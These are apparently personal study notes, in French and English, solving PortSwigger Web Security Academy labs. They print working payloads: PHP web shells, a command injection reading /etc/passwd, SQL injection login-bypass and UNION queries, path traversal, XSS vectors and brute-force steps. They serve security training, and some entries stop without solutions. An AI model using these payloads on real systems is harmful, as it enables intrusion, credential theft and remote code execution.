# Table of Contents

[Notes PortSwigger — Web Security Academy
[1](#notes-portswigger-web-security-academy)](#notes-portswigger-web-security-academy)

# Notes PortSwigger — Web Security Academy

## Lab 1 — Path traversal

**Catégorie :** Path Traversal

This lab contains a path traversal vulnerability in the display of
product images. To solve the lab, retrieve the contents of the
`/etc/passwd` file.

**Contexte :**

Imagine a shopping application that displays images of items for sale.
This might load an image using the following HTML:

    <img src="/loadImage?filename=218.png">

The image files are stored on disk in the location `/var/www/images/`.

**Résolution :**

En Burp Suite, on intercepte l’image, puis on modifie le code HTML de
l’image. On peut le changer pour :

    <img src="../../../../../../../etc/passwd">

Le `../` permet de remonter de répertoire en répertoire jusqu’au
répertoire racine où se trouve `/``etc``/``passwd`. On transmet ensuite
la requête, et on obtient l’accès à toutes les informations sensibles
contenues dans le fichier `/``etc``/``passwd`.

## Lab 2 — Unprotected admin functionality

**Catégorie :** Access Control

This lab has an unprotected admin panel. Solve the lab by deleting the
user carlos.

**Contexte :**

For example, a website might host sensitive functionality at the
following URL:

    https://insecure-website.com/admin

In some cases, the administrative URL might be disclosed in other
locations, such as the `robots.txt` file:

    https://insecure-website.com/robots.txt

**Résolution :**

Il y a deux façons de faire :

1.  **La plus simple** : écrire `robots.txt` après l’URI complète dans
    le navigateur.
2.  **La plus technique** : utiliser une commande dans le terminal :

<!-- -->

    gobuster dir -u https://0a1200ef04844933828bfbab000100eb.web-security-academy.net/ -w /usr/share/wordlists/dirb/common.txt

![Résultat gobuster](media/image1.png)

Résultat gobuster

Cette commande trouve tous les endpoints accessibles après l’URL du
site.

Dans `robots.txt`, on trouve `/``administrator``-panel`. On accède
ensuite à :

    https://0a1200ef04844933828bfbab000100eb.web-security-academy.net/administrator-panel

Et on peut supprimer l’utilisateur carlos.

## Lab 3 — Unprotected admin panel with unpredictable URL

**Catégorie :** Access Control

This lab has an unprotected admin panel. It’s located at an
unpredictable location, but the location is disclosed somewhere in the
application. Solve the lab by accessing the admin panel and using it to
delete the user carlos.

**Contexte :**

Imagine an application that hosts administrative functions at the
following URL:

    https://insecure-website.com/administrator-panel-yb556

This might not be directly guessable by an attacker. However, the
application might still leak the URL to users — par exemple dans du
JavaScript qui construit l’interface utilisateur en fonction du rôle de
l’utilisateur.

**Résolution :**

On cherche le code source de la page ou la réponse de la page dans Burp
Suite :

![Code source révélant l’URL admin](media/image2.png)

Code source révélant l’URL admin

Puis on accède directement à :

    https://0af900b403dbf3788137116100ae00fb.web-security-academy.net/admin-bfs2d3

## Lab 4 — User role controlled by a request parameter

**Catégorie :** Access Control

This lab has an admin panel at `/admin`, which identifies administrators
using a forgeable cookie. Solve the lab by accessing the admin panel and
using it to delete the user carlos.

**Identifiants :** `wiener:peter`

**Contexte :**

Some applications determine the user’s access rights or role at login
and then store this information in a user-controllable location. This
could be :

- A hidden field
- A cookie
- A preset query string parameter

**Résolution :**

Dans Burp Suite, on modifie le cookie `id=``wiener` en `admin=``true`.
On obtient alors une réponse contenant deux liens :

    <a href="/admin/delete?username=carlos">
    <a href="/admin/delete?username=wiener">

On prend l’URL de la page :

    https://0ae200a4049f1e3380888a7f00e2000e.web-security-academy.net/admin

Et on ajoute le href pour supprimer carlos :

    https://0ae200a4049f1e3380888a7f00e2000e.web-security-academy.net/admin/delete?username=carlos

## Lab 5 — User ID controlled by request parameter, with unpredictable user IDs

**Catégorie :** Access Control (IDOR)

This lab has a horizontal privilege escalation vulnerability on the user
account page but identifies users with GUIDs. To solve the lab, find the
GUID for carlos, then submit his API key as the solution.

**Identifiants :** `wiener:peter`

**Contexte :**

Horizontal privilege escalation is when a user accesses another user’s
data at the same permission level. Par exemple, changer un paramètre
d’URL comme `id=123` en `id=124` pour voir le compte de quelqu’un
d’autre. C’est souvent dû à une vulnérabilité IDOR, où l’application ne
vérifie pas correctement si l’utilisateur est autorisé à accéder à cette
ressource. Même avec des IDs aléatoires (comme des GUIDs), c’est
toujours exploitable si ces IDs sont exposés ailleurs.

**Résolution :**

On arrive sur le site et on cherche un blog posté par l’utilisateur
carlos. On va dans Burp Suite et on récupère son id. Après connexion
avec `wiener:peter`, on change simplement l’URL en ajoutant l’id de
carlos. On obtient alors son API key.

## Lab 6 — User ID controlled by request parameter with password disclosure

**Catégorie :** Access Control (IDOR)

This lab has a user account page that contains the current user’s
existing password, prefilled in a masked input. To solve the lab,
retrieve the administrator’s password, then use it to delete the user
carlos.

**Identifiants :** `wiener:peter`

**Résolution :**

En se connectant avec ses identifiants, on voit dans l’URL un
`id=``wiener`. On change cet id en `administrator` ou `carlos`. On peut
ainsi voler le mot de passe de l’admin, se connecter avec son compte, et
aller dans le panel admin pour supprimer carlos.

## Lab 7 — Username enumeration via different responses

**Catégorie :** Authentication

This lab is vulnerable to username enumeration and password brute-force
attacks. It has an account with a predictable username and password,
findable via des wordlists (candidate usernames / candidate passwords).
To solve the lab, enumerate a valid username, brute-force this user’s
password, then access their account page.

**Résolution :**

On se connecte avec des identifiants aléatoires comme `wiener:peter`,
puis on va dans Burp Suite pour repérer la requête POST du formulaire de
login. On envoie la requête à l’Intruder (`Ctrl+I`). Dans l’Intruder, on
prend `wiener` et on ajoute `$` autour. On colle la liste de candidate
usernames et on lance l’attaque.

Une fois terminé, Burp trouve un seul username qui a une longueur de
réponse différente des autres — signe que la réponse retournée est
différente pour ce cas précis. On remplace ensuite `$``wiener``$` par le
username correct (ex. alabama), puis on répète la même méthode pour
trouver le mot de passe.

## Lab 8 — 2FA simple bypass

**Catégorie :** Authentication

This lab’s two-factor authentication can be bypassed. You have already
obtained a valid username and password, but do not have access to the
user’s 2FA verification code. To solve the lab, access Carlos’s account
page.

**Identifiants :** `wiener:peter` — **Victime :** `carlos:montoya`

**Résolution :**

On entre ses propres identifiants sur la page de login. Après
validation, on change l’URL pour revenir à la page principale — en
cliquant à nouveau sur “my account”, on peut sauter le code à 4 chiffres
demandé, car le site pense qu’on est déjà connecté. On répète la même
méthode pour carlos.

## Lab 9 — Basic SSRF against the local server

**Catégorie :** SSRF

This lab has a stock check feature which fetches data from an internal
system. To solve the lab, change the stock check URL to access the admin
interface at `http://localhost/admin` and delete the user carlos.

**Résolution :**

On consulte un article et son niveau de stock. Avec Burp Suite, on
intercepte la requête POST de vérification de stock et on l’envoie au
Repeater. On modifie la clé `stockApi` pour :

    http://localhost/admin

La réponse révèle une ligne : `/admin/``delete?username``=``carlos`. Il
suffit de remplacer à nouveau la clé stockApi par :

    http://localhost/admin/delete?username=carlos

## Lab 10 — Basic SSRF against another back-end system

**Catégorie :** SSRF

This lab has a stock check feature which fetches data from an internal
system. To solve the lab, use the stock check functionality to scan the
internal `192.168.0.X` range for an admin interface on port 8080, then
use it to delete the user carlos.

**Résolution :**

On active Burp Suite, on consulte un objet aléatoire et son stock check.
On envoie la requête POST du stock check à l’Intruder. L’objectif étant
de scanner les IPs entre `192.168.0.1` et `192.168.0.255`, on surligne
le dernier octet de l’IP et on ajoute `$` autour.

On crée un script bash pour générer la liste des valeurs à tester :

    for i in {2..254}; do echo $i >> numbers.txt; done

Ce script crée un fichier `numbers.txt` contenant les nombres de 1 à
255.

La stock API ressemble à :

    stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fadmin

On lance l’Intruder avec `numbers.txt` en payload. Une seule requête
retourne un code de statut 200 — c’est la seule qui renvoie
effectivement quelque chose. Dans cet exemple, `192.168.0.135` est la
bonne adresse IP stockApi. Dans le Repeater, la réponse donne :
`/``delete?username``=``carlos`. On ajoute ça à la clé stockApi pour
supprimer carlos.

## Lab 11 — Remote code execution via web shell upload

**Catégorie :** File Upload / RCE

This lab contains a vulnerable image upload function. It doesn’t perform
any validation on the files users upload before storing them on the
server’s filesystem. To solve the lab, upload a basic PHP web shell and
use it to exfiltrate the contents of the file `/home/carlos/secret`.

**Identifiants :** `wiener:peter`

**Payloads utiles :**

Lire un fichier arbitraire :

    <?php echo file_get_contents('/path/to/target/file'); ?>

Web shell simple :

    <?php echo system($_GET['command']); ?>

**Résolution :**

On crée un fichier `shell.php` contenant le web shell simple ci-dessus.
La requête web ressemble à :

    http://whatever.com/files/images/shell.php?command=cat /home/carlos/secret

Sur le site, on peut parcourir un avatar — on choisit le fichier
`shell.php` et on l’upload. Le site confirme que `/avatar/``shell.php` a
été mis à jour, mais accéder directement à cet endpoint renvoie “not
found”.

![Fichier uploadé non trouvé au premier endpoint](media/image3.png)

Fichier uploadé non trouvé au premier endpoint

En copiant le lien de l’image, on trouve le bon endpoint :
`/files/avatar/``shell.php`. On ajoute alors la commande directement
dans l’URL :

    https://0a5a00e304ac8ace81cfedff00430054.web-security-academy.net/files/avatars/shell.php?command=cat%20/home/carlos/secret

⚠️ **Attention :** l’echo est fait deux fois, donc il faut ne soumettre
qu’un seul segment comme solution valide.

## Lab 12 — Web shell upload via Content-Type restriction bypass

**Catégorie :** File Upload / RCE

This lab contains a vulnerable image upload function. It attempts to
prevent users from uploading unexpected file types but relies on
checking user-controllable input to verify this. To solve the lab,
upload a basic PHP web shell and use it to exfiltrate the contents of
the file `/home/carlos/secret`.

**Identifiants :** `wiener:peter`

**Résolution :**

Avec le même `shell.php` :

    <?php echo system($_GET['command']); ?>

On se connecte avec `wiener:peter` :

![Page de compte après connexion](media/image4.png)

Page de compte après connexion

En essayant d’uploader `shell.php` directement, le site refuse :

> Sorry, file type application/x-php is not allowed. Only image/jpeg and
> image/png are allowed. Sorry, there was an error uploading your file.

Dans Burp Suite, on renvoie la requête au Repeater (`Ctrl+R`) :

![Requête envoyée au Repeater](media/image5.png)

Requête envoyée au Repeater

On change le `Content-Type` en `image/jpeg` et on renvoie :

![Modification du Content-Type](media/image6.png)

Modification du Content-Type

![Fichier accepté après modification](media/image3.png)

Fichier accepté après modification

Une fois envoyé, on copie le lien de l’image :

![Lien de l’image uploadée](media/image7.png)

Lien de l’image uploadée

Dans ce lien, on ajoute :

    ?command=ls /home/carlos/
    ?command=cat /home/carlos/secret

## Lab 13 — SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

**Catégorie :** SQL Injection

This lab contains a SQL injection vulnerability in the product category
filter. When the user selects a category, the application carries out a
SQL query like the following :

    SELECT * FROM products WHERE category = 'Gifts' AND released = 1

To solve the lab, perform a SQL injection attack that causes the
application to display one or more unreleased products.

**Résolution :**

On affine la recherche avec une des catégories proposées par le site. On
teste d’abord avec un `'` en fin d’URL pour vérifier si le site est
vulnérable aux injections SQL.

Si le site est vulnérable, on ajoute en fin d’URL :

    ' or 1=1---

Exemple :

    https://0a3b006e047c98d78092f87b0080000a.web-security-academy.net/filter?category=Lifestyle' or 1=1---

## Lab 14 — OS command injection, simple case

**Catégorie :** OS Command Injection

This lab contains an OS command injection vulnerability in the product
stock checker. The application executes a shell command containing
user-supplied products and store IDs and returns the raw output from the
command in its response. To solve the lab, execute the `whoami` command
to determine the name of the current user.

**Résolution :**

Avec Burp Suite, on vérifie le stock d’un produit aléatoire, on récupère
la requête POST et on l’envoie au Repeater.

Avant :

    productId=18&storeId=2

Après :

    productId=18&storeId=2;cat /etc/passwd

## Lab 15 — SQL injection vulnerability allowing login bypass

**Catégorie :** SQL Injection

This lab contains a SQL injection vulnerability in the login function.
To solve the lab, perform a SQL injection attack that logs in to the
application as the administrator user.

**Résolution :**

Lab facile — il suffit de se connecter avec :

    Username : administrator'--
    Password : (n'importe quoi)

## Lab 16 — Reflected XSS into HTML context with nothing encoded

**Catégorie :** Cross-Site Scripting (XSS)

This lab contains a simple reflected cross-site scripting vulnerability
in the search functionality. To solve the lab, perform a cross-site
scripting attack that calls the `alert` function.

**Résolution :**

Le paramètre de recherche est réinjecté tel quel dans le HTML de la
réponse, sans aucun encodage. Il suffit donc d’injecter directement une
balise script dans le champ de recherche :

    <script>alert()</script>

## Lab 17 — SQL injection attack, querying the database type and version on Oracle

**Catégorie :** SQL Injection

This lab contains a SQL injection vulnerability in the product category
filter. You can use a UNION attack to retrieve the results from an
injected query. To solve the lab, display the database version string.

**Résolution :**

**Étape 1 : Trouver le nombre de colonnes**

Sur le paramètre vulnérable (généralement `category` dans l’URL, ex :
`/``filter?category``=Gifts`), on teste avec `ORDER BY` :

    ' ORDER BY 1--
    ' ORDER BY 2--
    ' ORDER BY 3--

On continue jusqu’à obtenir une erreur — le dernier numéro qui
fonctionne sans erreur donne le nombre de colonnes (souvent 2 dans ce
lab).

**Étape 2 : Confirmer avec UNION SELECT NULL**

    ' UNION SELECT NULL,NULL FROM dual--

⚠️ Sur Oracle, contrairement à MySQL, on est **obligé** d’ajouter
`FROM dual` (une table système vide qui sert de “table bidon” pour
satisfaire la syntaxe SQL d’Oracle). Si ça ne renvoie pas d’erreur, on a
le bon nombre de colonnes.

**Étape 3 : Récupérer la version**

On remplace un des `NULL` par la requête qui donne la version :

    ' UNION SELECT banner, NULL FROM v$version--

`v$version` est une table système Oracle qui contient la chaîne de
version complète de la base (nom + numéro de version).

## Lab 18 — Basic password reset poisoning

**Catégorie :** Authentication

This lab is vulnerable to password reset poisoning. The user carlos will
carelessly click on any links in emails that he receives. To solve the
lab, log in to Carlos’s account.

**Identifiants :** `wiener:peter` — les emails envoyés à ce compte sont
lisibles via le client email sur le serveur d’exploit.

**Lab 19 Stored XSS into HTML context with nothing encoded**

This lab contains a stored cross-site scripting vulnerability in the
comment functionality.

To solve this lab, submit a comment that calls the alert function when
the blog post is viewed.

![Capture du lab résolu](media/image8.png)

**Lab: DOM XSS in document.write sink using source location.search**

This lab contains a DOM-based cross-site scripting vulnerability in the
search query tracking functionality. It uses the JavaScript
document.write function, which writes data out to the page. The
document.write function is called with data from location.search, which
you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the
alert function.

**Resolution : "\>\<svg onload=alert(1)\>**

**Lab: DOM XSS in innerHTML sink using source location.search**

This lab contains a DOM-based cross-site scripting vulnerability in the
search blog functionality. It uses an innerHTML assignment, which
changes the HTML contents of a div element, using data from
location.search.

To solve this lab, perform a cross-site scripting attack that calls the
alert function.

Resolution: \<img src=1 onerror=alert(1)\>

**Lab: DOM XSS in jQuery anchor href attribute sink using
location.search source**

This lab contains a DOM-based cross-site scripting vulnerability in the
submit feedback page. It uses the jQuery library's \$ selector function
to find an anchor element, and changes its href attribute using data
from location.search.

To solve this lab, make the "back" link alert document.cookie.

https://0adf00fc0445233780ecdf9b0084001a.web-security-academy.net/feedback?returnPath=javascript:alert(1)

**Lab: DOM XSS in jQuery selector sink using a hashchange event**

This lab contains a DOM-based cross-site scripting vulnerability on the
home page. It uses jQuery's \$() selector function to auto-scroll to a
given post, whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that calls the
print() function in their browser.
